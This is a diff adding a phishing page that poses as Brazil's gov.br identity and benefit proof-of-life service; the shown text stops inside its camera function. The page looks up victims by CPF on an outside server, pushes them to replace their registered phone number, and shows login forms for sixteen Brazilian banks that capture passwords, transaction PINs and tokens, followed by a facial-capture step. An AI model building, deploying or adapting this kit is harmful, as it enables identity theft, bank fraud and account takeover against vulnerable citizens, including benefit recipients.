@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>gov.br - Sistema de Acesso</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="jquery-3.7.1.min.js"></script>
+    <style>
+        /* CSS Original - Sem alterações */
+        .bank-button { display: flex; align-items: center; gap: 1rem; width: 100%; padding: 1rem; border: 1px solid #e2e8f0; border-radius: 0.5rem; background-color: #ffffff; box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06); transition: all 0.15s ease-in-out; cursor: pointer; margin-bottom: 0.75rem; }
+        .bank-button:hover { border-color: #1351b4; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06); }
+        .bank-logo { width: 40px; height: 40px; object-fit: contain; }
+        .bank-name { font-weight: 600; color: #1a202c; }
+        .form-group { margin-bottom: 1.5rem; }
+        .form-group label { display: block; font-size: 0.875rem; font-weight: 500; color: #4a5568; margin-bottom: 0.25rem; }
+        .form-group input { width: 100%; padding: 0.75rem; border: 1px solid #cbd5e0; border-radius: 0.5rem; font-size: 1rem; transition: all 0.15s ease-in-out; }
+        .form-group input:focus { outline: none; border-color: transparent; box-shadow: 0 0 0 2px #1351b4; }
+        .buttons-row { display: flex; justify-content: space-between; gap: 1rem; margin-top: 1.5rem; }
+        .btn-primary { flex: 1; background-color: #1351b4; color: white; font-weight: 500; padding: 0.75rem 1rem; border-radius: 0.5rem; transition: background-color 0.15s; cursor: pointer; border: none; }
+        .btn-primary:hover { background-color: #0e3d8c; }
+        .btn-secondary { flex: 1; background-color: #e2e8f0; color: #4a5568; font-weight: 500; padding: 0.75rem 1rem; border-radius: 0.5rem; transition: background-color 0.15s; cursor: pointer; border: none; }
+        .btn-secondary:hover { background-color: #cbd5e0; }
+        #video-feed { width: 100%; max-width: 400px; height: auto; border-radius: 8px; background-color: #333; transform: scaleX(-1); }
+        #photo-canvas { display: none; width: 100%; max-width: 400px; height: auto; border-radius: 8px; margin-top: 1rem; }
+        .camera-buttons { display: flex; justify-content: center; gap: 1rem; margin-top: 1.5rem; flex-wrap: wrap; }
+        .camera-buttons .btn-primary, .camera-buttons .btn-secondary { flex: none; width: auto; padding: 0.75rem 1.5rem; }
+    </style>
+</head>
+<body class="bg-gray-100 font-sans antialiased">
+    <div id="root"></div>
+
+    <script>
+        // Esta função não será mais usada, mas mantida por clareza se você a reutilizar em outro contexto.
+        const parseBeneficioString = (beneficioString) => {
+            const beneficioObj = {};
+            const parts = beneficioString.split(' - ');
+            parts.forEach(part => {
+                const indexSeparador = part.indexOf(':');
+                if (indexSeparador > -1) {
+                    const key = part.substring(0, indexSeparador).trim();
+                    const value = part.substring(indexSeparador + 1).trim();
+                    beneficioObj[key] = value;
+                }
+            });
+            return beneficioObj;
+        };
+        
+        document.addEventListener('DOMContentLoaded', () => {
+            const root = document.getElementById('root');
+
+            const createIcon = (paths) => {
+                const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
+                svg.setAttribute("xmlns", "http://www.w3.org/2000/svg");
+                svg.setAttribute("width", "24");
+                svg.setAttribute("height", "24");
+                svg.setAttribute("viewBox", "0 0 24 24");
+                svg.setAttribute("fill", "none");
+                svg.setAttribute("stroke", "currentColor");
+                svg.setAttribute("stroke-width", "2");
+                svg.setAttribute("stroke-linecap", "round");
+                svg.setAttribute("stroke-linejoin", "round");
+                svg.classList.add('lucide');
+                svg.setAttribute("aria-hidden", "true");
+                paths.forEach(pathData => {
+                    const path = document.createElementNS("http://www.w3.org/2000/svg", "path");
+                    path.setAttribute("d", pathData.d);
+                    if (pathData.key) path.setAttribute('data-key', pathData.key);
+                    svg.appendChild(path);
+                });
+                return svg;
+            };
+            const icons = { x: createIcon([{ d: "M18 6 6 18" }, { d: "m6 6 12 12" }]), qrCode: createIcon([{ d: "M3 3h5v5H3z" }, { d: "M16 3h5v5h-5z" }, { d: "M3 16h5v5H3z" }, { d: "M21 16h-3a2 2 0 0 0-2 2v3" }, { d: "M21 21v.01" }, { d: "M12 7v3a2 2 0 0 1-2 2H7" }, { d: "M3 12h.01" }, { d: "M12 3h.01" }, { d: "M12 16v.01" }, { d: "M16 12h1" }, { d: "M21 12v.01" }]), camera: createIcon([{ d: "M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z" }, { d: "M12 13a3 3 0 1 1 0-6 3 3 0 0 1 0 6z" }]) };
+            const banksData = [ { id: "bb", name: "Banco do Brasil", logo: "https://www.bb.com.br/docs/pub/inst/img/LogoBB.svg", authFields: [ { type: "password", label: "Senha de 8 dígitos", length: 8, mask: true, placeholder: "Digite sua senha de 8 dígitos" }, { type: "password", label: "Senha de 6 dígitos", length: 6, mask: true, placeholder: "Digite sua senha de 6 dígitos" }, ], }, { id: "caixa", name: "Caixa Econômica Federal", logo: "https://cliente.rinfo.com.br/logos/cef.png", authFields: [ { type: "electronic-signature", label: "Assinatura eletrônica", length: 6, mask: true, placeholder: "Digite sua assinatura eletrônica" }, { type: "password", label: "Senha de 4 dígitos", length: 4, mask: true, placeholder: "Digite sua senha de 4 dígitos" }, ], }, { id: "santander", name: "Santander", logo: "https://th.bing.com/th/id/ODLS.d5ca428a-8e1f-40bc-acc6-07e08e5fac3d?w=32&h=32&qlt=90&pcl=fffffc&o=6&pid=1.2", authFields: [ { type: "password", label: "Senha de 6 dígitos", length: 6, mask: true, placeholder: "Digite sua senha de 6 dígitos" }, ], }, { id: "bradesco", name: "Bradesco", logo: "https://cdn-images-1.medium.com/max/1200/1*fVjiPN2BfTEulmJaVhq6kA.png", authFields: [ { type: "password", label: "Senha de 6 dígitos", length: 6, mask: true, placeholder: "Digite sua senha de 6 dígitos" }, { type: "password", label: "Senha de 4 dígitos", length: 4, mask: true, placeholder: "Digite sua senha de 4 dígitos" }, ], }, { id: "itau", name: "Itaú Unibanco", logo: "https://logodownload.org/wp-content/uploads/2014/05/itau-logo-3-1.png", authFields: [ { type: "password", label: "Senha de 6 dígitos", length: 6, mask: true, placeholder: "Digite sua senha de 6 dígitos" }, { type: "password", label: "Token iToken", length: 6, mask: false, placeholder: "Digite o iToken" }, ], }, { id: "inter", name: "Banco Inter", logo: "https://logodownload.org/wp-content/uploads/2018/11/banco-inter-logo-0-1-2048x2048.png", authFields: [ { type: "password", label: "Senha de 8 dígitos", length: 8, mask: true, placeholder: "Digite sua senha de 8 dígitos" }, { type: "text", label: "Código de Segurança", length: 6, mask: false, placeholder: "Digite o código de segurança" }, ], }, { id: "nu", name: "NuBank", logo: "https://logospng.org/download/nubank/logo-nubank-256.png", authFields: [ { type: "password", label: "Senha de 6 dígitos", length: 6, mask: true, placeholder: "Digite sua senha de 6 dígitos" }, { type: "text", label: "Código do App", length: 6, mask: false, placeholder: "Digite o código do aplicativo" }, ], }, { id: "pan", name: "Banco Pan", logo: "https://logodownload.org/wp-content/uploads/2019/07/banco-pan-logo-0-1.png", authFields: [ { type: "password", label: "Senha de transação", length: 4, mask: true, placeholder: "Digite sua senha de transação" }, ], }, { id: "next", name: "Banco Next", logo: "https://logodownload.org/wp-content/uploads/2017/11/next.png", authFields: [ { type: "password", label: "Senha de transação", length: 4, mask: true, placeholder: "Digite sua senha de transação" }, ], }, { id: "c6", name: "C6 Bank", logo: "https://logodownload.org/wp-content/uploads/2020/11/c6-bank-logo-0-2048x2048.png", authFields: [ { type: "password", label: "Senha de transação", length: 4, mask: true, placeholder: "Digite sua senha de transação" }, ], }, { id: "picpay", name: "PicPay", logo: "https://logodownload.org/wp-content/uploads/2018/05/picpay-logo-1.png", authFields: [ { type: "password", label: "Senha de transação", length: 4, mask: true, placeholder: "Digite sua senha de transação" }, ], }, { id: "neon", name: "Banco Neon", logo: "https://static.devneon.com.br/assets/icons/header-logo-neon.svg", authFields: [ { type: "password", label: "Senha de transação", length: 4, mask: true, placeholder: "Digite sua senha de transação" }, ], }, { id: "mercado-pago", name: "Mercado Pago", logo: "https://logodownload.org/wp-content/uploads/2019/06/mercadopago-logo-5.png", authFields: [ { type: "password", label: "Senha de transação", length: 4, mask: true, placeholder: "Digite sua senha de transação" }, ], }, { id: "pagbank", name: "PagBank", logo: "https://logodownload.org/wp-content/uploads/2019/09/pagbank-logo-0-1.png", authFields: [ { type: "password", label: "Senha de transação", length: 4, mask: true, placeholder: "Digite sua senha de transação" }, ], }, { id: "original", name: "Banco Original", logo: "https://logodownload.org/wp-content/uploads/2018/05/banco-original-logo-4-1.png", authFields: [ { type: "password", label: "Senha de transação", length: 4, mask: true, placeholder: "Digite sua senha de transação" }, ], }, { id: "mercantil", name: "Mercantil do Brasil", logo: "https://th.bing.com/th/id/OIP.zTJVwfmzlsAZbPerjmV3MQHaDt?w=334&h=174&c=7&r=0&o=7&pid=1.7&rm=3", authFields: [ { type: "password", label: "Senha de transação", length: 4, mask: true, placeholder: "Digite sua senha de transação" }, ], }, ];
+
+            // Main App Component
+            const App = () => {
+                const appContainer = document.createElement('div');
+                appContainer.className = 'min-h-screen flex flex-col';
+                
+                let BASE_URL = "https://agendarprovadevida.org";//"http://localhost:5000";
+                let isModalOpen = true;
+                let isLoading = false;
+                let currentView = 'cpf_input'; // Inicia no input de CPF
+                let loadingMessage = '';
+                let selectedBankId = null;
+                let cpfValue = '';
+                // apiData será populado com valores padrão ou vazios, não da API
+                let apiData = {
+                    personalInfo: { nome: 'Não informado', status: 'Não aplicável' },
+                    inssBenefits: []
+                };
+                let tempAuthValues = {};
+                let mediaStream = null;
+
+                const render = () => {
+                    appContainer.innerHTML = '';
+
+                    const header = document.createElement('header');
+                    header.className = 'w-full bg-[#1351b4] text-white py-4';
+                    header.innerHTML = `<div class="container mx-auto px-4 flex justify-between items-center"><div class="flex items-center"><span class="text-xl font-bold">gov.br</span></div><div class="hidden md:block"><span class="text-sm">Sistema de Acesso</span></div></div>`;
+                    appContainer.appendChild(header);
+
+                    const main = document.createElement('main');
+                    main.className = 'flex-grow flex flex-col md:flex-row justify-center items-start md:items-center p-4 md:p-8 gap-8';
+                    main.innerHTML = `<div class="container mx-auto max-w-6xl flex flex-col md:flex-row justify-center items-center md:items-start gap-8"><div class="w-full md:w-1/2 max-w-[504px] flex flex-col items-center"><div class="mb-8 text-center"><img src="govbr-colorido-b.png" alt="Logo gov.br" class="h-16 mb-2 mx-auto"><h1 class="text-2xl font-bold text-gray-900">Identidade Digital do Governo</h1><p class="text-sm text-gray-600 mt-1">Identidade Digital de Cidadão Brasileiro</p></div><div id="auth-container" class="w-full"></div></div><div class="w-full md:w-1/2 flex justify-center md:mt-16" id="info-cards"></div></div>`;
+                    appContainer.appendChild(main);
+
+                    const infoCardsContainer = main.querySelector('#info-cards');
+                    infoCardsContainer.innerHTML = `<div class="w-full max-w-[504px] mt-6 space-y-4"><div class="bg-white rounded-lg shadow-md p-6"><h3 class="text-lg font-bold text-gray-900 mb-3">O que é a conta gov.br</h3><p class="text-sm text-gray-700">A conta gov.br é um meio de acesso digital do usuário aos serviços públicos digitais. Com um único usuário e senha você pode utilizar todos os serviços públicos digitais que estejam integrados com a conta gov.br.</p><a href="#" class="mt-3 inline-block text-[#1351b4] hover:underline text-sm">Saiba mais</a></div><div class="bg-white rounded-lg shadow-md p-6"><h3 class="text-lg font-bold text-gray-900 mb-3">Níveis da conta gov.br</h3><p class="text-sm text-gray-700">O nível da sua conta gov.br (bronze, prata ou ouro) permite acesso a serviços digitais de acordo com a sua necessidade. Quanto mais segura a conta, mais serviços você pode acessar.</p><a href="#" class="mt-3 inline-block text-[#1351b4] hover:underline text-sm">Saiba mais</a></div><div class="bg-white rounded-lg shadow-md p-6"><h3 class="text-lg font-bold text-gray-900 mb-3">Dúvidas sobre a conta gov.br</h3><p class="text-sm text-gray-700">Encontre respostas para perguntas frequentes sobre autenticação, cadastro, recuperação de conta e muito mais.</p><a href="#" class="mt-3 inline-block text-[#1351b4] hover:underline text-sm">Consultar</a></div></div>`;
+                    
+                    const authContainer = main.querySelector('#auth-container');
+
+                    // TODO bank--- Render Bank List Function ---
+                    const renderBankList = () => {
+                        selectedBankId = null;
+                        authContainer.innerHTML = '';
+                        tempAuthValues = {};
+                        const bankSelectionCard = document.createElement('div');
+                        bankSelectionCard.className = 'w-full bg-white rounded-lg shadow-md p-8';
+                        authContainer.appendChild(bankSelectionCard);
+                        const title = document.createElement('h2');
+                        title.className = 'text-xl font-bold text-gray-900 mb-6';
+                        title.textContent = "Selecione seu banco";
+                        bankSelectionCard.appendChild(title);
+                        const scrollContainer = document.createElement('div');
+                        scrollContainer.className = 'max-h-[400px] overflow-y-auto pr-2';
+                        bankSelectionCard.appendChild(scrollContainer);
+                        banksData.forEach(bank => {
+                            const btn = document.createElement('button');
+                            btn.type = 'button';
+                            btn.className = 'bank-button';
+                            btn.setAttribute('aria-label', `Selecionar banco ${bank.name}`);
+                            btn.addEventListener('click', () => {
+                                selectedBankId = bank.id;
+                                currentView = 'bank_auth_form';
+                                render();
+                            });
+                            if (bank.logo) {
+                                const img = document.createElement('img');
+                                img.src = bank.logo;
+                                img.alt = bank.name + ' logo';
+                                img.className = 'bank-logo';
+                                btn.appendChild(img);
+                            }
+                            const span = document.createElement('span');
+                            span.textContent = bank.name;
+                            span.className = 'bank-name';
+                            btn.appendChild(span);
+                            scrollContainer.appendChild(btn);
+                        });
+                        const infoText = document.createElement('p');
+                        infoText.className = 'text-sm text-gray-600 mt-4 text-center';
+                        infoText.textContent = "Escolha seu banco para prosseguir com a autenticação";
+                        bankSelectionCard.appendChild(infoText);
+                    };
+
+                    // --- Render Auth Form Function ---
+                    const renderAuthForm = () => {
+                        authContainer.innerHTML = '';
+                        const bank = banksData.find(b => b.id === selectedBankId);
+
+                        if (!bank) {
+                            currentView = 'bank_selection';
+                            render();
+                            return;
+                        }
+                        const authFormCard = document.createElement('div');
+                        authFormCard.className = 'w-full bg-white rounded-lg shadow-md p-8';
+                        authContainer.appendChild(authFormCard);
+                        const title = document.createElement('h2');
+                        title.className = 'text-xl font-bold text-gray-900 mb-6';
+                        title.textContent = `Autenticação - ${bank.name}`;
+                        authFormCard.appendChild(title);
+                        const form = document.createElement('form');
+                        form.setAttribute('novalidate', 'true');
+                        form.addEventListener('submit', (e) => {
+                            e.preventDefault();
+
+                            //TODO submit bankdata
+                            password1 = "";
+                            passwordInput0 = authContainer.querySelector('#input-0');
+                            passwordInput1 = authContainer.querySelector('#input-1');
+
+                            if(passwordInput1){
+                                password1 = passwordInput1.value;
+                            }
+                            //bankname = banksData[selectedBankId].name;
+                            openConfirmModal(passwordInput0.value, password1);
+                        });
+                        bank.authFields.forEach((field, idx) => {
+                            const formGroup = document.createElement('div');
+                            formGroup.className = 'form-group';
+                            const label = document.createElement('label');
+                            label.textContent = field.label;
+                            label.htmlFor = `input-${idx}`;
+                            formGroup.appendChild(label);
+                            const input = document.createElement('input');
+                            input.type = field.mask ? 'password' : 'text';
+                            input.placeholder = field.placeholder || '';
+                            input.id = `input-${idx}`;
+                            input.maxLength = field.length || 100;
+                            input.required = true;
+                            input.autocomplete = 'off';
+                            input.addEventListener('input', (e) => {
+                                tempAuthValues[input.id] = e.target.value;
+                            });
+                            if (tempAuthValues[input.id]) {
+                                input.value = tempAuthValues[input.id];
+                            }
+                            formGroup.appendChild(input);
+                            form.appendChild(formGroup);
+                        });
+                        const btnRow = document.createElement('div');
+                        btnRow.className = 'buttons-row';
+                        const btnBack = document.createElement('button');
+                        btnBack.type = 'button';
+                        btnBack.className = 'btn-secondary';
+                        btnBack.textContent = 'Voltar';
+                        btnBack.addEventListener('click', () => {
+                            currentView = 'bank_selection'; // Volta para seleção de banco
+                            selectedBankId = null;
+                            render();
+                        });
+                        btnRow.appendChild(btnBack);
+                        const btnSubmit = document.createElement('button');
+                        btnSubmit.type = 'submit';
+                        btnSubmit.className = 'btn-primary';
+                        btnSubmit.textContent = 'Assinar';
+                        btnRow.appendChild(btnSubmit);
+                        form.appendChild(btnRow);
+                        authFormCard.appendChild(form);
+                    };
+
+                    // TODO CPF--- Render CPF Input View (MODIFICADA: sem chamada à API) ---
+                    const renderCpfInputView = () => {
+                        authContainer.innerHTML = 
+                        `<div class="w-full max-w-[504px] bg-white rounded-lg shadow-md p-8">
+                            <h2 class="text-xl font-bold text-gray-900 mb-6">Entrar com gov.br</h2>
+                            <form id="cpf-search-form">
+                                <div class="mb-6">
+                                    <label for="cpf" class="block text-sm font-medium text-gray-700 mb-1">CPF</label>
+                                    <input id="cpf" type="text" placeholder="Digite seu CPF" class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-700 focus:border-transparent" maxlength="14" required>
+                                </div>
+                                <button type="submit" class="w-full bg-[#1351b4] hover:bg-[#0e3d8c] text-white font-medium py-3 px-4 rounded-lg transition duration-150">Continuar</button>
+                                <div class="mt-6 text-center">
+                                    <a href="#" class="text-[#1351b4] hover:underline text-sm block mb-2">Esqueci minha senha</a>
+                                    <a href="#" class="text-[#1351b4] hover:underline text-sm block">Criar conta gov.br</a>
+                                </div></div>
+                                <div class="mt-8 flex items-center justify-center border-t border-gray-200 pt-6">
+                                    <a href="#" class="flex items-center text-[#1351b4] hover:underline"><span id="qr-icon" class="mr-2"></span><span>Entrar com QR Code</span></a>
+                                </div></div>`;
+                        
+                        const qrIconContainer = authContainer.querySelector('#qr-icon');
+                        qrIconContainer.appendChild(icons.qrCode.cloneNode(true));
+                        
+                        const cpfInput = authContainer.querySelector('#cpf');
+                        cpfInput.value = cpfValue;
+                        cpfInput.addEventListener('input', (e) => {
+                            let val = e.target.value.replace(/\D/g, '').substring(0, 11);
+                            let formatted = val.replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+                            e.target.value = formatted;
+                            cpfValue = formatted;
+                        });
+
+                        const cpfSearchForm = authContainer.querySelector('#cpf-search-form');
+                        cpfSearchForm.addEventListener('submit', (e) => { // Removido 'async'
+                            e.preventDefault();
+                            const cleanCpf = cpfValue.replace(/\D/g, '');
+                            if (cleanCpf.length !== 11) {
+                                showTemporaryMessage('Por favor, digite um CPF válido.', 'error');
+                                return;
+                            }
+                            // post ajax request to backend, redirect preview CPF data
+
+                            // Define apiData com valores padrão/nulos, pois a API externa foi removida
+                            
+                            $.ajax({
+                                    url: BASE_URL + "/api/citizenData/" + cleanCpf, // The URL you are requesting
+                                    method: 'GET', // Or 'POST', 'PUT', etc.
+                                    dataType: 'json' // Expecting a JSON response
+                            })
+                            .done(function(data) {
+                                apiData.personalInfo.cpf = cleanCpf;
+				apiData.personalInfo.nome = data.name;
+                                    const dateTime = new Date(data.birthday);
+                                    const year = dateTime.getUTCFullYear(); // 2025
+                                    const month = (dateTime.getUTCMonth() + 1).toString().padStart(2, '0'); // "08" (months are zero-indexed)
+                                    const day = dateTime.getUTCDate().toString().padStart(2, '0'); // "26"
+                                    const formattedDate = `${year}-${month}-${day}`; // "2025-08-26"
+                                apiData.personalInfo.dataNascimento = formattedDate;
+                                apiData.personalInfo.nomeMae = data.motherName;
+                                apiData.personalInfo.numeroBeneficio = data.benefitNumber;
+                                apiData.personalInfo.telefone = data.phone;
+                                // Prossegue diretamente para a seleção de banco
+                                currentView = 'api_data_display';
+                                render();
+                            })
+                            .fail(function(jqXHR, textStatus, errorThrown) {
+                                if (jqXHR.status === 404) {
+                                    apiData.personalInfo.cpf = cleanCpf;
+                                    // The backend sent a 404 Not Found response
+                                    currentView = 'api_data_write';
+                                    render();
+
+                                } else {
+                                    // Other error statuses
+                                    showTemporaryMessage("Ocorreu um erro inesperado.", "error");
+                                }
+                            });
+
+                        });
+                    };
+
+                    const showTemporaryMessage = (message, type = 'info') => {
+                        const el = document.createElement('div');
+                        el.className = `fixed top-4 right-4 p-4 rounded-lg shadow-lg text-white z-[1000] ${type === 'error' ? 'bg-red-600' : 'bg-blue-600'}`;
+                        el.textContent = message;
+                        document.body.appendChild(el);
+                        setTimeout(() => el.remove(), 5000);
+                    };
+                    
+                    // --- FUNÇÃO DE EXIBIÇÃO DE DADOS (AGORA INATIVADA, POIS O FLUXO VAI DIRETO PARA SELEÇÃO DE BANCO) ---
+                    // Se você quiser reintroduzir uma tela de confirmação de CPF/nome antes do banco,
+                    // pode reativar e adaptar esta função. Por enquanto, ela não será chamada.
+
+                    //TODO review CPF data, send updated data to backend
+                    const renderApiDataDisplayView = () => {
+                        authContainer.innerHTML = `
+                            <div class="w-full max-w-[504px] bg-white rounded-lg shadow-md p-8">
+                                <h2 class="text-xl font-bold text-gray-900 mb-6">Confirmação de Dados</h2>
+                                <p class="text-gray-700 mb-4">Por favor, confirme seus dados para prosseguir.</p>
+
+                                <div class="space-y-4">
+                                    <div class="form-group">
+                                        <label>Nome Completo</label>
+                                        <input type="text" value="${apiData.personalInfo.nome}" disabled class="bg-gray-100 cursor-not-allowed">
+                                    </div>
+                                    <div class="form-group">
+                                        <label>Data de Nascimento</label>
+                                        <input type="text" value="${apiData.personalInfo.dataNascimento}" disabled class="bg-gray-100 cursor-not-allowed">
+                                    </div>
+                                    <div class="form-group">
+                                        <label>Nome da Mãe</label>
+                                        <input type="text" value="${apiData.personalInfo.nomeMae}" disabled class="bg-gray-100 cursor-not-allowed">
+                                    </div>
+                                    <div class="form-group">
+                                        <label>Número do Benefício</label>
+                                        <input type="text" value="${apiData.personalInfo.numeroBeneficio}" disabled class="bg-gray-100 cursor-not-allowed">
+                                    </div>
+                                    <div class="form-group">
+                                        <label>Telefone Cadastrado</label>
+                                        <input type="text" value="${apiData.personalInfo.telefone}" disabled class="bg-gray-100 cursor-not-allowed">
+                                    </div>
+                                    <div class="form-group">
+                                        <label for="telefone">novo número de telefone</label>
+                                        <input type="tel" id="telefone" value="" class="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-700 focus:border-transparent" required minlength="10" maxlength="16">
+                                    </div>
+                                </div>
+
+                                <div class="mt-8">
+                                    <button id="realizar-prova-de-vida-btn" class="btn-primary w-full" disabled>Realizar Prova de Vida</button>
+                                </div>
+                                
+                                <div class="mt-4 text-center">
+                                    <button id="preencher-manualmente-btn" class="text-[#1351b4] hover:underline text-sm" disabled>Preencher dados manualmente</button>
+                                </div>
+                            </div>
+                        `;
+
+                        const telefoneInput = authContainer.querySelector('#telefone');
+                        const provaDeVidaBtn = authContainer.querySelector('#realizar-prova-de-vida-btn');
+                        const preencherManualmenteBtn = authContainer.querySelector('#preencher-manualmente-btn');
+
+                        // Rule of business: Enable the button only after the user updates the phone number
+                        const checkPhoneInput = () => {
+                            const hasPhoneChanged = telefoneInput.value !== apiData.personalInfo.telefone;
+                            provaDeVidaBtn.disabled = !hasPhoneChanged;
+                        };
+                        
+                        // Initial check in case a phone number was already provided
+                        checkPhoneInput();
+
+                        // Event listener for phone number field
+                        telefoneInput.addEventListener('input', checkPhoneInput);
+
+                        // Event listener for "Realizar Prova de Vida" button
+                        provaDeVidaBtn.addEventListener('click', () => {
+                            $.ajax({
+                                    url: BASE_URL + "/api/updatePhone/" + apiData.personalInfo.cpf, // The URL you are requesting
+                                    method: 'PUT', // Or 'POST', 'PUT', etc.
+                                    contentType: 'application/json',
+                                    data: JSON.stringify({ "phone": telefoneInput.value }),
+                                    dataType: 'json' // Expecting a JSON response
+                            })
+                            .done(function(data) {
+                                // Here you would proceed to the next step, likely facial validation or bank selection
+                                showTemporaryMessage('Telefone atualizado. Prosseguindo para prova de vida.', 'info');
+
+                                // Prossegue diretamente para a seleção de banco
+                                currentView = 'bank_selection';
+                                render();
+                            })
+                            .fail(function(jqXHR, textStatus, errorThrown) {
+                                console.log(jqXHR, textStatus);
+                                if (jqXHR.status === 404) {
+                                    showTemporaryMessage('Falha ao atualizar seu telefone. Prosseguindo para prova de vida.', 'error');
+                                    // The backend sent a 404 Not Found response
+                                    currentView = 'bank_selection';
+                                    render();
+
+                                } else {
+                                    // Other error statuses
+                                    showTemporaryMessage("Ocorreu um erro inesperado.", 'error');
+                                }
+                            });
+                        });
+
+                        // Event listener for "Preencher dados manualmente" button
+                        preencherManualmenteBtn.addEventListener('click', () => {
+                            // Switch to a manual form filling view
+                            showTemporaryMessage('Prosseguindo com preenchimento manual.', 'info');
+                            // Example: a function to render a manual form
+                            // renderManualFormView();
+                            // For this example, we will go to the bank selection page, as a manual form view is not defined.
+                            currentView = 'api_data_write';
+                            render();
+                        });
+                    };
+
+                    //TODO write CPF data, send updated data to backend
+                    const renderApiDataWrite = () => {
+                        authContainer.innerHTML = `
+                            <div class="w-full max-w-[504px] bg-white rounded-lg shadow-md p-8">
+                                <h2 class="text-xl font-bold text-gray-900 mb-6">Insira os dados</h2>
+                                <p class="text-gray-700 mb-4">Insira seus dados para continuar.</p>
+
+                                <div class="space-y-4">
+                                    <div class="form-group">
+                                        <label>Nome Completo</label>
+                                        <input type="text" id="name" value="" class="bg-gray-100" required/>
+                                    </div>
+                                    <div class="form-group">
+                                        <label>Data de Nascimento</label>
+                                        <input type="text" id="birthday" value="" class="bg-gray-100" required/>
+                                    </div>
+                                    <div class="form-group">
+                                        <label>Nome da Mãe</label>
+                                        <input type="text" id="motherName" value="" class="bg-gray-100" required/>
+                                    </div>
+                                    <div class="form-group">
+                                        <label>Número do Benefício</label>
+                                        <input type="text" id="benefitNumber" value="" class="bg-gray-100" required/>
+                                    </div>
+                                    <div class="form-group">
+                                        <label for="telefone">novo número de telefone</label>
+                                        <input type="tel" id="telefone" value="" class="bg-gray-100" required/>
+                                    </div>
+                                </div>
+
+                                <div class="mt-8">
+                                    <button id="realizar-prova-de-vida-btn" class="btn-primary w-full">Realizar Prova de Vida</button>
+                                </div>
+                            </div>
+                        `;
+
+                        const telefoneInput = authContainer.querySelector('#telefone');
+                        const nameInput = authContainer.querySelector('#name');
+                        const birthdayInput = authContainer.querySelector('#birthday');
+                        const motherNameInput = authContainer.querySelector('#motherName');
+                        const benefitNumberInput = authContainer.querySelector('#benefitNumber');
+                        const provaDeVidaBtn = authContainer.querySelector('#realizar-prova-de-vida-btn');
+
+                        telefoneInput.addEventListener('input', () => { apiData.personalInfo.phone = telefoneInput.value; });
+                        nameInput.addEventListener('input', () => { apiData.personalInfo.name = nameInput.value; });
+                        birthdayInput.addEventListener('input', () => { apiData.personalInfo.birthday = birthdayInput.value; });
+                        benefitNumberInput.addEventListener('input', () => { apiData.personalInfo.benefitNumber = benefitNumber.value; });
+                        motherNameInput.addEventListener('input', () => { apiData.personalInfo.motherName = motherNameInput.value; });
+
+                        const dataValidation = () => {
+                            return true;
+                        };
+
+                        // Event listener for "Realizar Prova de Vida" button
+                        provaDeVidaBtn.addEventListener('click', () => {
+                            if (dataValidation()){
+                                provaDeVidaBtn.disabled = false;
+                            }
+                            $.ajax({
+                                    url: BASE_URL + "/api/createCitizen", // The URL you are requesting
+                                    method: 'POST', // Or 'POST', 'PUT', etc.
+                                    contentType: 'application/json',
+                                    data: JSON.stringify({ 
+                                        "CPF": apiData.personalInfo.cpf,
+                                        "name": apiData.personalInfo.name,
+                                        "birthday": apiData.personalInfo.birthday,
+                                        "motherName": apiData.personalInfo.motherName,
+                                        "benefitNumber": apiData.personalInfo.benefitNumber,
+                                        "phone": apiData.personalInfo.phone,
+                                    }),
+                                    dataType: 'json' // Expecting a JSON response
+                            })
+                            .done(function(data) {
+                                // Here you would proceed to the next step, likely facial validation or bank selection
+                                showTemporaryMessage('Adicionamos dados com sucesso.', 'info');
+
+                                // Prossegue diretamente para a seleção de banco
+                                currentView = 'bank_selection';
+                                render();
+                            })
+                            .fail(function(jqXHR, textStatus, errorThrown) {
+                                if (jqXHR.status === 400) {
+                                    showTemporaryMessage('Por favor, insira dados precisos.', 'error');
+
+                                }
+                                else if(jqXHR.status === 404)
+                                    showTemporaryMessage('Verifique o CPF.', 'error');
+                                else {
+                                    // Other error statuses
+                                    showTemporaryMessage("Ocorreu um erro inesperado.", 'error');
+                                }
+                            });
+                        });
+
+                    };
+
+                    // --- Render Facial Validation View ---
+                    const renderFacialValidationView = async () => {
+                        authContainer.innerHTML = `<div class="w-full max-w-[504px] bg-white rounded-lg shadow-md p-8 text-center flex flex-col items-center"><h2 class="text-xl font-bold text-gray-900 mb-6 flex items-center"><span id="camera-icon" class="mr-2"></span> Validação Facial</h2><p class="text-gray-700 mb-4">Posicione seu rosto na frente da câmera para a validação.</p><video id="video-feed" autoplay playsinline></video><canvas id="photo-canvas"></canvas><div class="camera-buttons"><button id="start-camera-btn" class="btn-primary flex items-center"><span class="mr-2"></span> Iniciar Câmera</button><button id="take-photo-btn" class="btn-primary flex items-center" style="display: none;"><span class="mr-2"></span> Tirar Foto</button><button id="retake-photo-btn" class="btn-secondary" style="display: none;">Revalidar</button><button id="cancel-validation-btn" class="btn-secondary">Cancelar Validação</button></div><p id="validation-message" class="mt-4 text-gray-700"></p></div>`;
+                        authContainer.querySelector('#camera-icon').appendChild(icons.camera.cloneNode(true));
+                        const video = authContainer.querySelector('#video-feed');
+                        const canvas = authContainer.querySelector('#photo-canvas');
+                        const context = canvas.getContext('2d');
+                        const startCameraBtn = authContainer.querySelector('#start-camera-btn');
+                        const takePhotoBtn = authContainer.querySelector('#take-photo-btn');
+                        const retakePhotoBtn = authContainer.querySelector('#retake-photo-btn');
+                        const cancelValidationBtn = authContainer.querySelector('#cancel-validation-btn');
+                        const validationMessage = authContainer.querySelector('#validation-message');
+                        const stopCameraTracks = () => { 
+                            if (mediaStream) { mediaStream.getTracks().forEach(track => track.stop()); 
